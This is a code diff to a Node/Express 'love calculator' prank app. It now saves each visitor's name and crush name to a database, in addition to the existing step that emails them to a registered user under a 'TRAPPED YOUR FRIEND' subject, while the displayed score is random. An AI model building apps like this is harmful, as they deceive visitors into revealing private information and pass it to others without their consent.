@@ -6,6 +6,7 @@ const ejs = require('ejs')
 const db = require('./db')
 const sendMail = require('./sendMail')
 const User = require('./user.model')
+const Crush = require('./crush.model')
 
 const port = process.env.PORT || 5000
 const app = express()
@@ -60,6 +61,10 @@ app.post('/:id', async (req, res) => {
         })
         if (user) {
             sendMail(user.email, 'LOVE CALCULATOR TRAPPED YOUR FRIEND', `Name: ${req.body.name} Crush: ${req.body.crushname}`)
+            await Crush.create({
+                name: req.body.name,
+                crushName: req.body.crushname
+            })
             let value = Math.floor(Math.random() * 100)
             res.render('result', { name: req.body.name, crushname: req.body.crushname, value: value })
         }
